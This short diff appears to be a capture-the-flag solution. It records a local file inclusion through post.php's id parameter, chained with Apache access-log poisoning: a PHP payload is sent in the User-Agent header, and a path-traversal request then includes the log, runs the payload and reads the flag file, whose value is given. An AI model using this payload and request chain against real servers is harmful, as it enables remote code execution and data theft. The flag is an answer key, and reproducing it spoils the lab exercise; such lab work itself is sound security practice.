@@ -1,0 +1,4 @@
+# LFI via post.php?id= parameter. Step 1: poison access.log by sending User-Agent: <?php echo file_get_contents('/FLAG.php'); ?>. Step 2: include the log via LFI to execute the PHP payload and extract the flag. FLAG: flag{6f592559-dcf0-436c-ad0f-f0447b0444d9}
+
+GET /post.php?id=../../../../var/log/apache2/access.log HTTP/1.1
+Host: 172.17.0.1:49967
